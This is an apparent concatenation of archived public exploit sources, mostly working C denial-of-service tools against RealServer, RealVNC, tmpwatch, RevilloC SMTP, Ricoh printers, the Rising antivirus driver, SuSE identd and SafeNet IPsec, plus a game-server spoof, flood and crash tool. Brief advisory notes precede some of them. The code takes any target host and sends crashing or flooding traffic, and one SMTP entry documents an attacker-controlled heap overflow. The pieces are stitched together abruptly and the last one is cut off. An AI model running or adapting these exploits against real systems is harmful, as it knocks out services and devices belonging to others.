                memcpy(msg + sizeof(MSGHDR) - 5, &msglen, 4);
                memcpy(msg + sizeof(MSGHDR) - 1, argv[i], msglen);
                msglen += sizeof(MSGHDR) - 1;
                rdcksum(msg, msglen);
                } break;
            case 'c': {
                attack = 3;
                rdcksum(crash, sizeof(crash) - 1);
                } break;
            case 'd': {
                attack = 4;
                rdcksum(disc1, sizeof(disc1) - 1);
                rdcksum(disc2, sizeof(disc2) - 1);
                } break;
            default: {
                printf("\nError: wrong command-line parameter (%s)\n", argv[i]);
                exit(1);
            }
        }
    }

    if(!attack) {
        fputs("\nError: you must choose an attack! Recheck the available options\n", stdout);
        exit(1);
    }

    peer.sin_addr.s_addr       = resolv(argv[argc]);
    peer.sin_port              = htons(port);
    peer.sin_family            = AF_INET;
    plen                       = sizeof(peer);

    printf("\n"
        "Target:         %s:%hu\n"
        "Chosen version: %d\n"
        "\n",
        inet_ntoa(peer.sin_addr), port,
        version);

    rd1[13] = version;
    rdcksum(rd1, sizeof(rd1) - 1);
    rd2[7] = version;
    rdcksum(rd2, sizeof(rd2) - 1);
    rdcksum(rd3, sizeof(rd3) - 1);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    SNDRCV(rd1, sizeof(rd1) - 1);

    printf("\n"
        "Servername: %s\n"
        "Players:    %d/%d\n",
        buff + 17,
        buff[41], buff[37]);

        // password
    if(buff[33]) {
        fputs("Server requires password, insert it:\n", stdout);
        fflush(stdin);
        fgets(rd2 + 21, 16, stdin);
        rd2[17] = strlen(rd2 + 21) - 1;    // last byte is 0x0a
    }

    SNDRCV(rd2, sizeof(rd2) - 1);

    if(*buff == 8) {
        switch(buff[7]) {
            case 2: fputs(
                "race      race in progress, impossible to continue the attack\n", stdout); break;
            case 3: fputs(
                "full      the server is full, impossible to continue the attack\n", stdout); break;
            default: {
                fputs("\nError: Unknown error, probably your password is wrong or you are testing a server that doesn't support this protocol\n", stdout);
            } break;
        }
// seems that sometimes I get a "server full" error also if the server is not full.
// Remove these comments to enable the classical errors management
//        close(sd);
//        exit(1);
    }

    if(sendto(sd, rd3, sizeof(rd3) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    fputc('.', stdout);

    switch(attack) {
        case 1: {
            printf("\nSpoofed message from ID %d:\n", id);
            SNDRCV(msg, msglen);
            } break;
        case 2: {
            printf("\nSpoofed messages flooding from ID %d:\n", id);
            while(1) {
                SNDRCV(msg, msglen);
                sleep(ONESEC);
            }
            } break;
        case 3: {
            fputs("\nCrash attack:\n", stdout);
            SNDRCV(crash, sizeof(crash) - 1);
            if(sendto(sd, rd1, sizeof(rd1) - 1, 0, (struct sockaddr *)&peer, plen)
              < 0) std_err();
            fputs("- BOOM packet sent, now I check if the server is down\n", stdout);
            if(timeout(sd) < 0) {
                fputs("\nThe server IS vulnerable!!!\n", stdout);
            } else {
                fputs("\nThe server doesn't seem vulnerable\n", stdout);
            }
            } break;
        case 4: {
            fputs("\nDisconnection attack:\n", stdout);
            SNDRCV(disc1, sizeof(disc1) - 1);
            SNDRCV(disc2, sizeof(disc2) - 1);
            } break;
    }
    close(sd);

    fputc('\n', stdout);
    return(0);
}





int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}




u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}




#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif




source: http://www.securityfocus.com/bid/888/info

RealServer 5.0 can be crashed by sending an overly long (4082+ bytes) ramgen request. Regular functionality can be restored by restarting the RealServer software. 

/*
 *  rmscrash.c  - bow@bow.net
 *
 *  Crash a RealMedia 5.0 server by sending a very long ramgen request. 
 *
 *  Test on:
 *         $ pnserver -v
 *         Version:        5.0-rvserver-build-290
 *         Platform: FreeBSD-2.1.x
 *
 */

#include        <stdio.h>
#include        <stdlib.h>
#include        <sys/time.h>
#include        <sys/types.h>
#include        <unistd.h>

#include        <sys/socket.h>
#include        <netinet/in.h>
#include        <netdb.h>

#define BUFLEN 4082

char    buf[BUFLEN+14];
int     sock;
struct  sockaddr_in sa;
struct  hostent *hp;

void main (int argc, char *argv[]) {
        int i, port;

        if (argc < 3) {
                printf("Usage: %s realserver port\n",argv[0]);
                exit(-1);
        }

        port = atoi(argv[2]);

        memset(buf,0x41,BUFLEN);
        memcpy(buf,"GET /ramgen/",12);
        memcpy(buf+BUFLEN," HTTP/1.1\r\n\r\n", 13);


        if ((hp=(struct hostent *)gethostbyname(argv[1]))==NULL) {
                perror("gethostbyname()");
                exit(0);
        }

        if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
                perror("socket()");
                exit(0);
        }
        sa.sin_family=AF_INET;
        sa.sin_port=htons(port);
        memcpy((char *)&sa.sin_addr,(char *)hp->h_addr,hp->h_length);
        if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))!=0) {
                perror("connect()");
                exit(0);
        }

        printf("Connected to %s. Sending data\n",argv[1]);
        write(sock,buf,strlen(buf));
        printf("Done.\n");

        close(sock);
        exit(0);
}

source: http://www.securityfocus.com/bid/11048/info

RealVNC server is reported prone to a remote denial of service vulnerability. This issue presents itself when an attacker establishes a large amount connections to the server.

This issue was reportedly tested on RealVNC 4.0 running on Microsoft Windows 2000. 

/****************************************************************************
 *                                                                          *
 *               RealVNC 4.0 remote ddos Exploit                            *
 *                                                                          *
 *  This is a stupid bug and stupid exploit. and this toy for kiddies       *
 * Tested agains Windows XP,2000 and 98. it works well and the test servers *
 * are down with an ADSL Router heheh :p    have fun..                      *
 * Anyway what can i say more...                                            *
 * Gr33t1ngz: N4rK07IX, blueStar, L4M3R.                                    *
 *                                                                          *
 *                            Code by Uz4yh4N <Lord@Linuxmail.org>          *
 *                                                                          *
 ****************************************************************************/



#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define PORT 5900
#define TIMES 160

main(int argc, char *argv[])
{
    int sockfd[TIMES+5],i;
    struct hostent *he;
    struct sockaddr_in servaddr;



    if(argc != 2) {
      fprintf(stdout, "\n Usage: %s hostname/ip \n\n",argv[0]);
      exit(-1);
    }
    if ((he=gethostbyname(argv[1])) == NULL) {
            perror("gethostbyname");
            exit(-1);
        }

    for(i=0;i<TIMES;++i) {

      if((sockfd[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
         perror("socket");
            exit(-1);
      }
    }

 servaddr.sin_family = AF_INET;
 servaddr.sin_port = htons(PORT);
 servaddr.sin_addr = *((struct in_addr *)he->h_addr);
 memset(&(servaddr.sin_zero), '\0', 8);

 fprintf(stderr, "[+] Trying...\n");

  for(i=0;i<TIMES;++i) {

    if(connect(sockfd[i], (struct sockaddr *)&servaddr, sizeof(struct sockaddr)) == -1) {
          fprintf(stderr, "[+] The target must be down..\n");
          goto done;
        }

 }

 done:
  for(i=i;i>0;i--)
    close(sockfd[i]);

  fprintf(stdout, "[+] Done..\n");

  return 0;

}

source: http://www.securityfocus.com/bid/1664/info

Any user with write access to /tmp or /var/tmp, can induce tmpwatch to cause Red Hat (and others runnng tmpwatch from cron) to stop responding, and possibly require a hard reboot. This is accomplished by creating a directory tree many (ie. ~6000) nodes deep in /tmp. For each level of the directory in /tmp, tmpwatch will fork() a new copy of itself.

Red Hat affected versions:

Red Hat Linux 7.0 (tmpwatch v.2.5.1)
Red Hat Linux 6.2 (tmpwatch v.2.2) 

Note:
(excerpted from Internet Security Systems Security Advisory)

"Source code comparison between the Red Hat Linux 6.2 and 7.0 tmpwatch packages
suggests this vulnerability was recognized and a fix was attempted. However,
the fix is incorrect, and the vulnerability is still exploitable.

Do not use the --fuser or -s options with tmpwatch."

---START---cut---:a.c (mode 644)
// 
// make lots of directories.
// ./a <#of-dirs>
// ./a with no arguments to delete dirs.
main(int argc,char *argv[])
{
int c=0,d=0;
if (argc!=2) 
{
while(!chdir("./A"))c++;
chdir("..");
printf("c=%d removing\n",c);
while(!rmdir("./A")) {chdir("..");c--;}
if(c)printf("erm. bad thing.\n");
}
else
{
c=atoi(argv[1]);
printf("c=%d making.\n",c);
while(c--)
{
mkdir("./A",0777);
chdir("./A");
} 
}
}
--END---cut-----:a.c

# ./testscript

(code follows)

---START---cut---:testscript (mode 755)
#!/bin/sh
# clear the previous stuff.
./a 
rm ./timer.results
touch timer.results
# create a 1 deep
./a 1 >>timer.results
time tmpwatch 240 . 2>>timer.results
# create a 100 deep
./a 100 >>timer.results
time tmpwatch 240 . 2>>timer.results
# create a 200 deep
./a 200 >>timer.results
time tmpwatch 240 . 2>>timer.results
# create a 300 deep
./a 300 >>timer.results
time tmpwatch 240 . 2>>timer.results
# create a 400 deep
./a 400 >>timer.results
time tmpwatch 240 . 2>>timer.results
# create a 500 deep
./a 500 >>timer.results
time tmpwatch 240 . 2>>timer.results
# create a 600 deep
./a 600 >>timer.results
time tmpwatch 240 . 2>>timer.results
#tidy up.
./a >>timer.results

--END---cut-----:testscript

If you don't want to test it manually, here you will find the results on
the tests on my machine. Who says u need an Athlon with cable or DSL. I
say "Well, it would be nice. Real nice." I also think this program would
probably die faster and more spectacularly on a fast machine with a huge
amount of memory and swap space. Oh yeah. Save anything important. And you
have to run it as root. (I think. Should probably thought of that. I'll
remember it for next time.) The crontab is an effective way of getting it
run as root. Which it wants to do anyway. At about 4am everyday.

--START---cut---:timer.results (mode 644)
c=1 making.
0.00user 0.01system 0:00.00elapsed 125%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (96major+58minor)pagefaults 0swaps
c=100 making.
0.01user 0.19system 0:00.19elapsed 100%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (96major+1797minor)pagefaults 0swaps
c=200 making.
0.07user 0.40system 0:00.49elapsed 94%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (96major+3554minor)pagefaults 0swaps
c=300 making.
0.10user 0.66system 0:00.76elapsed 99%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (96major+5308minor)pagefaults 0swaps
c=400 making.
0.13user 1.33system 0:11.80elapsed 12%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (11766major+9445minor)pagefaults 1263swaps
c=500 making.
0.15user 2.11system 0:22.38elapsed 10%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (14104major+13238minor)pagefaults 2699swaps
c=600 making.
0.21user 2.81system 0:32.61elapsed 9%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (26066major+17781minor)pagefaults 4109swaps
c=600 removing
c=600 making.
0.11user 2.88system 0:36.14elapsed 8%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (25741major+17567minor)pagefaults 4009swaps
c=700 making.
0.20user 4.24system 0:45.95elapsed 9%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (35562major+22180minor)pagefaults 5542swaps
c=800 making.
Command terminated by signal 2
0.00user 0.00system 6:01.87elapsed 0%CPU (0avgtext+0avgdata 0maxresident)k
0inputs+0outputs (102major+18minor)pagefaults 10swaps
--END---cut-----:timer.results

(System is Cyrix-6x86 @ 187 MHz, 32M physical ram, 64M swap.)

(^C was pressed after about a minute into the 800 deep one. Several system
programs died due to memory starvation. It took a quite a while afterwards
before the console regained any usabilty. When i tried to run startx, it
refused to start. xfs had died. everything looked odd. slow motion. i
think it was because of the loadavg)

# uptime
9:00pm up 2:14, 2 users, load average: 202.28, 363.68, 186.46/*
=============================================================
0-day RCPT TO DoS Exploit for RevilloC SMTP version 1.x
=============================================================
Sending a large buffer  (4080 bytes) in conjunction with the "MAIL
FOR:" or "RCPT TO:"  and other commands can cause a denial of service
attack causing the application to crash, consume 99% CPU usage until
the application is terminated or cause the host computer to stop
responding entirely requiring a reboot.  Also a heap overflow attack
vector is possible, sending a buffer greater than 4088 bytes causes
EDI, EBX, and EAX and ECX to be overwritten with values of the
malformed packet.

If you have the time to turn this into an Exploit go for it.  Just
credit me thats all i ask.  I wish i had the time but my full time
job of coding silly 200,000+ line accounting applications is a hand full.


The buffer overflow happens here:
7C91B3FB   . 8B0B           MOV ECX,DWORD PTR DS:[EBX]
7C91B3FD   . 3B4F 04        CMP ECX,DWORD PTR DS:[EDI+4]

EAX 001669F0
ECX 00004141  << points to a section of the buffer
EDX 00AD0030
EBX 88888888 << can be controlled by the attacker
ESP 0012F2D0
EBP 0012F4EC
ESI 001669E8
EDI 77777777 << can be controlled by the attacker
EIP 7C91B3FB ntdll.7C91B3FB
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDF000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
DR0 00000000
DR1 00000000
DR2 00000000
DR3 00000000
DR6 00000000
DR7 00000000


and here is the stack
0012F2F4  /0012F334
0012F2F8  |4CDE2A15  RETURN to IDPDX32.4CDE2A15 from <JMP.&IDAPI32.OsMuxUnlock>
0012F2FC  |010587BC
0012F300  |4BE5274A  IDAPI32.4BE5274A
0012F304  |00000001
0012F308  |77777777
0012F30C  |0012F334
0012F310  |00000000
0012F314  |00120000
0012F318  |00000000
0012F31C  |0012F300
0012F320  |4CDE2877  RETURN to IDPDX32.4CDE2877 from IDPDX32.4CE163F4
0012F324  |0012FC18
0012F328  |FFFFFFFF
0012F32C  |01065DBC
0012F330  |00000000
0012F334  ]0012F34C
0012F338  |4BE4095E  RETURN to IDAPI32.4BE4095E from IDAPI32.4BE41D04
0012F33C  |0012F7D8
0012F340  |0000002D
0012F344  |6BDE97A6
0012F348  |0012F7D8
0012F34C  \0012F7B8

and on closer inspection it appears its trying to turn the parameter
into a lowercase format.  (This was when the RCPT TO: command was overflowed)

001659F0  6C 61 64 64 72 65 73 73 00 6C 6F 77 65 72 00 41  laddress.lower.A
00165A00  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00165A10  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
...... huge buffer....
001669E0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
001669F0  77 77 77 77 88 88 88 88 00 00 00 00 00 00 00 00  wwww............


This was quickly compiled in LCC-Win32 (Free C++ compiler and IDE)
- Greg Linares
Questions/Comments/Etc --> GLinares.code [at] gmail [dot] com
*/



#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
static char overflow[65000];
static char buff2[65000];
WSADATA wsaData;


struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
int i;
char *hostname;
unsigned short port;

if (argc <= 1)
   {
	  printf("\n===========================================================\n");
	  printf("0-day RevilloC SMTP Mail Server Suite <= 1.21 RCPT TO: DoS\n");
	  printf("Exploits the RCPT TO parameter (MAIL FROM can be exploited too)\n");
	  printf("Buffer > 4080 causes the app to crash - heap based overflow\n");
	  printf("Exploit and Discovered By: Greg Linares (glinares.code [at ] gmail [dot] com)\n");
	  printf("==============================================================\n");
      printf("Usage: %s [hostname] [port]\n", argv[0]);
      printf("default port is 25 \n");
      exit(0);
   }


hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi("25");

if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   {
      fprintf(stderr, "Error setting up with WinSock v1.1\n");
      exit(-1);
   }


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf("ERROR: Uknown host %s\n", hostname);
	  printf("%s",hostname);
      exit(-1);
   }

   sockin.sin_family = hp->h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Socket Error\n");
      exit(-1);
   }

   if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf("ERROR: Connect Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Recv Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }

   /* wait for SMTP service welcome*/
   buf[bytes] = '\0';
   check = strstr(buf, "2");
   if (check == NULL)
   {
      printf("ERROR: NO  response from SMTP service\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   static char Exp1[65000];
   memset(Exp1, 0, 4096);
   char Exp[] = "RCPT TO: ";
   char tail[] = "@a.com>\r\n";
   char A[] = "A";
   memset(overflow, 0, 65000);
   memset(buff2, 0, 100);
   for (i=0; i<100; i++)
	{
	   strcat(buff2, "A");
	}

   char EHLO[] = "EHLO \r\n";
   char MF[] = "MAIL FROM: <HI@";
 	strcat(overflow, MF);
	strcat(overflow, buff2);
	strcat(overflow, tail);



   send(sockfd, EHLO, strlen(EHLO), 0);
	Sleep(500);
	send(sockfd, overflow, strlen(overflow),0);
	Sleep(1000);
	strcat(Exp1, Exp);
	for (i=0; i<4096; i++){
		strcat(Exp1, A);
	}
	strcat(Exp1, "\xDE\xAD\xBA\xBE");
	strcat(Exp1, tail);

	printf("%s", Exp1);
	send(sockfd, Exp1, strlen(Exp1),0);
	Sleep(2000);
    printf("Overflow Packet Sent Successfully...\n");
	closesocket(sockfd);
   WSACleanup();
 }

// milw0rm.com [2006-10-25]
/*

* RICOH Aficio 450/455 PCL 5e Printer ICMP DOS vulnerability Exploit.

* DATE: 12.15.2004

* Vuln Advisory : Hongzhen Zhou<felix__zhou _at_ hotmail _dot_ com>

* Exploit Writer : x90c(Kyong Joo)@www.chollian.net/~jyj9782

*

* Testing -----------------------------------------------

* root@testbed:~/raw# gcc -o rpcl_icmpdos rpcl_icmpdos.c

* root@testbed:~/raw# ./rpcl_icmpdos

* Usage: ./rpcl_icmpdos <victim>

* root@testbed:~/raw# ./rpcl_icmpdos 192.168.2.4

* exploit sent ok() = ..x-_-x..

* root@testbed:~/raw#

*

*/

#include<sys/types.h>

#include<sys/socket.h>

#include<netinet/in.h>

#include<arpa/inet.h>

#include<linux/ip.h>

#include<linux/icmp.h>

unsigned short cksum(unsigned short *buf, int len);

struct icmp_packet{

       struct icmphdr icmp;

       struct iphdr inip;

       unsigned char bigger[90];               // STEP1: Bigger Data(ICMP Header(8)+ inip(20) + 90(bigger data))

} packet;

/* ########################

* #     Entry Point      #

* ########################

*/

int main(int argc, char *argv[]){

struct sockaddr_in ca;

int sockfd, ret;

if(argc<2){

       printf("Usage: %s <victim>\n", argv[0]);

       exit(-1);

}

sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

memset(&packet, 0, sizeof(packet));

packet.icmp.type = 3;                           // STEP2: Destination Unreachable.

packet.icmp.code = 1;

packet.icmp.un.echo.id = getpid();

packet.icmp.un.echo.sequence = 0;

packet.inip.ihl = 5;

packet.inip.version = 4;

packet.inip.tot_len = htons(20);

packet.inip.id = htons(9090);

packet.inip.ttl = 90;

packet.inip.protocol = IPPROTO_TCP;             // STEP3: IPPROTO_UDP also useable.

packet.inip.saddr = inet_addr("127.0.0.1");

packet.inip.daddr = inet_addr("127.0.0.1");

packet.inip.check = (unsigned short) cksum((unsigned short *)&packet.inip, 20);

packet.icmp.checksum = cksum((void *)&packet, sizeof(packet));

memset(&ca, 0, sizeof(ca));

ca.sin_family = AF_INET;

ca.sin_addr.s_addr = inet_addr(argv[1]);

if((sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&ca, sizeof(ca))) == sizeof(packet))

       printf("exploit sent ok() = ..x-_-x..\n");

else

       printf("exploit sent failed() = ..o^O^o..\n");

close(sockfd);

}

/* ########################

* #  Internet Checksum   #

* ########################

*/

unsigned short cksum(unsigned short *buf, int len){

register unsigned long sum;

for(sum = 0; len > 0; len--) sum += *buf++;

sum = (sum >> 16) + (sum & 0xffff);

sum += (sum >> 16);

return ~sum;

}

// milw0rm.com [2004-12-15]
source: http://www.securityfocus.com/bid/11932/info

It is reported that Ricoh 450/455 printers are susceptible to a remote denial of service vulnerability. This issue is due to a failure of the device to properly handle exceptional ICMP packets.

Remote attackers may exploit this vulnerability to restart affected devices. Repeated packets may be utilized to sustain the condition, causing the device to repeatedly restart. Source addresses of the malicious ICMP packets may also be spoofed, reducing the likelihood of locating, or blocking access to the attacker.

Due to code reuse among devices, it is likely that other printers are also affected.

/*
 * RICOH Aficio 450/455 PCL 5e Printer ICMP DOS vulnerability Exploit.
 * DATE: 12.15.2004
 * Vuln Advisory : Hongzhen Zhou<felix__zhou _at_ hotmail _dot_ com>
 * Exploit Writer : x90c(Kyong Joo)@www.chollian.net/~jyj9782
 *
 * Testing -----------------------------------------------
 * root@testbed:~/raw# gcc -o rpcl_icmpdos rpcl_icmpdos.c
 * root@testbed:~/raw# ./rpcl_icmpdos
 * Usage: ./rpcl_icmpdos <victim>
 * root@testbed:~/raw# ./rpcl_icmpdos 192.168.2.4
 * exploit sent ok() = ..x-_-x..
 * root@testbed:~/raw#
 *
 */

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<linux/ip.h>
#include<linux/icmp.h>

unsigned short cksum(unsigned short *buf, int len);

struct icmp_packet{
        struct icmphdr icmp;
        struct iphdr inip;
        unsigned char bigger[90];               // STEP1: Bigger Data(ICMP Header(8)+ inip(20) + 90(bigger data))
} packet;


/* ########################
 * #     Entry Point      #
 * ########################
*/

int main(int argc, char *argv[]){
struct sockaddr_in ca;
int sockfd, ret;

if(argc<2){
        printf("Usage: %s <victim>\n", argv[0]);
        exit(-1);
}

sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

memset(&packet, 0, sizeof(packet));

packet.icmp.type = 3;                           // STEP2: Destination Unreachable.
packet.icmp.code = 1;
packet.icmp.un.echo.id = getpid();
packet.icmp.un.echo.sequence = 0;

packet.inip.ihl = 5;
packet.inip.version = 4;
packet.inip.tot_len = htons(20);
packet.inip.id = htons(9090);
packet.inip.ttl = 90;
packet.inip.protocol = IPPROTO_TCP;             // STEP3: IPPROTO_UDP also useable.
packet.inip.saddr = inet_addr("127.0.0.1");
packet.inip.daddr = inet_addr("127.0.0.1");
packet.inip.check = (unsigned short) cksum((unsigned short *)&packet.inip, 20);

packet.icmp.checksum = cksum((void *)&packet, sizeof(packet));

memset(&ca, 0, sizeof(ca));
ca.sin_family = AF_INET;
ca.sin_addr.s_addr = inet_addr(argv[1]);


if((sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&ca, sizeof(ca))) == sizeof(packet))
        printf("exploit sent ok() = ..x-_-x..\n");
else
        printf("exploit sent failed() = ..o^O^o..\n");


close(sockfd);

}


/* ########################
 * #  Internet Checksum   #
 * ########################
*/

unsigned short cksum(unsigned short *buf, int len){
register unsigned long sum;

for(sum = 0; len > 0; len--) sum += *buf++;
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
return ~sum;
}/*
On the net.We can found these file has published a BUG.In that.The BUG has found in CONTROL CODE:0x83003C0B.So.I check these file
in othere CONTROL CODE.Just for fun.....

# Exploit Title: [Rising RSNTGDI.sys Local Denial of Service(CONTROL CODE:83003C13) ]
# Date: [2010.11.1]
# Author: [ ze0r ]
# Version: [Rising 2009.Publish Date:2009.10.13.]
# Tested on: [Windows XPSP3 Chinese Simplified & Windows 2003 Chinese Simplified]
*/


#include "stdio.h"
#include "windows.h"

HANDLE DriverHandle =0; 

void boom(PVOID systembuffer,PVOID userbuffer)
{
	printf("userbuffer Is:%p\n\n",userbuffer);
	printf("The systembuffer Is:%p\n\n",systembuffer);
	DeviceIoControl(DriverHandle, 
	0x83003C13, 
	systembuffer,
	20,
	userbuffer, 
	20,
	(DWORD *)0, 
	0);
	return ; 
}

int main(int argc, char* argv[])
{
	printf("-------------------------------------------------------------------------------\n");
	printf("---------------------------C0ed By:ze0r,Let's ROCK!!---------------------------\n");
	printf("----------------------------------QQ:289791332---------------------------------\n");
	printf("-------------------------------------------------------------------------------\n\n");
	DriverHandle=CreateFile("\\\\.\\rsntgdi", 
	0,
	FILE_SHARE_READ | FILE_SHARE_WRITE , 
	0,
	OPEN_EXISTING,0,0);
	if (DriverHandle == INVALID_HANDLE_VALUE)
	{
		printf("Open Driver Error!\n\n");
		return 0 ; 
	}
	
	printf("OK.Let's Crash It!\n\n");
	getchar();

	boom((PVOID)0x88888888,(PVOID)0x88888888);
	
	return 0;
}source: http://www.securityfocus.com/bid/587/info

In the inetd.conf under certain distributions of SuSE Linux the in.identd daemon is started with the -w -t120 option. This means that one identd process waits 120 seconds after answering the first request to answer the next request. If a malicious remote attacker starts a large number of ident requests in a short period of time it will force the target machine to start multiple daemons because the initial daemon is in a time wait state. This can eventually lead the machine to starve itself of memory resulting essentially in a machine halt.

/* susekill.c by friedolin
 * 
 * used to kill lame SuSE Linux boxes with identd running
 * identd must be started with -w -t120 to crash a machine
 *
 * have fun, friedolin <hendrik@scholz.net>
 *
 * based on gewse.c by napster
 */

/* Tested systems:
 *
 * vulnerable:
 *
 *  SuSE-Linux 4.4 - 6.2
 *  Slackware  3.2 and 3.6
 *
 * not vulnerable:
 *
 *  RedHat 5.0 - 6.0 
 *  Debian 2.0 - 2.1
 * 
 * not tested:
 *
 *  pre 4.3 SuSE systems
 *  pre 5.0 RedHat
 *  pre 2.0 Debian
 *  other Slackware releases
 *  Caldera Open Linux, ...
 *
 * please send me your results and experiences !
 * 
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>

#define GETIDENT "1027, 6667 : USERID : UNIX : killsuse"

int sockdesc;
int portkill;
int numkill;
int x;

void usage(char *progname)
{
  printf("susekill by friedolin (based on gewse.c)\n");
  printf("usage: %s <host> <# of connections>\n",progname);
  exit(69);
}

main(int argc, char *argv[])
{
    
 struct sockaddr_in sin;
 struct hostent *he;

 if (argc<3) usage(argv[0]);
  
 sin.sin_port = htons(113);
 sin.sin_family = AF_INET;
 
 he = gethostbyname(argv[1]);
 if (he) {
   sin.sin_family = AF_INET;
   sin.sin_port = htons(113);
   memcpy((caddr_t)&sin.sin_addr.s_addr, he->h_addr, he->h_length);
 } else {
   perror("resolving");
 }

 numkill  = atoi(argv[2]);

 printf("Flooding %s [%s] identd %d times.\n", argv[1], inet_ntoa(sin.sin_addr.s_addr), numkill);
 printf("Killing");
 fflush(stdout);

 for (x=1;x<=numkill;x++) {

 sockdesc = socket(AF_INET, SOCK_STREAM, 0);

 if (sockdesc < 0) {
  perror("socket");
  exit(69);
 }
  
  if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
   perror("connect");
   exit(69);
  }

  printf(" .");
  fflush(stdout);
  (void) write(sockdesc, GETIDENT, strlen(GETIDENT));
 }

 printf("\n");

}
/* safenet-dos.c
 *
 * SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS (win32)
 * by John Anderson <john@ev6.net>
 *    mu-b <mu-b@digit-labs.org>
 * - Mar 2006 - June 2007
 *
 * - Tested on: SafeNet HighAssurance Remote 1.4.0 (Build 12) (win32)
 *
 * Kernel level (Ring0) DoS in IPv6 support of IPSecDrv.sys
 * (causes an infinite loop in searching option headers 0x1000BEB0).
 *
 * This POC only works on a local subnet since it sends an invalid packet
 * and any sensible router will drop it. However, this is exploitable
 * remotely with IPv6.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <libnet.h>
#include <sys/time.h>

#define IPV4_HDR_LEN  20
#define IPV6_HDR_LEN  40
#define UDP_LEN       16

struct opt
{
  u_char nxt_hdr;
  u_char opt_len;
};

unsigned long int
lookup (char *hostname)
{
  struct hostent *name;
  unsigned long int address;

  if ((address = inet_addr (hostname)) != -1)
    return address;
  if ((name = gethostbyname (hostname)) == NULL)
    return -1;

  memcpy (&address, name->h_addr, name->h_length);
  return (address);
}

int
main (int argc, char **argv)
{
  u_char *buf = NULL;

  /* libnet vars */
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *lnsock;
  char *device = NULL;

  /* packet vars */
  struct ip *ip_hdr = NULL;
  struct opt *opt_hdr = NULL;
  u_int32_t src_ip = 0, dst_ip = 0;

  printf ("SafeNet HighAssurance Remote ~1.4.0 Ring0 DoS POC\n"
          "by John Anderson <john@ev6.net>\n"
          "   mu-b <mu-b@digit-labs.org>\n\n");

  if (!argv[1])
    {
      printf ("Usage: %s <destination> [source]\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  /* allocate space for packet */
  if ((buf = malloc (IPV6_HDR_LEN + UDP_LEN)) == NULL)
    {
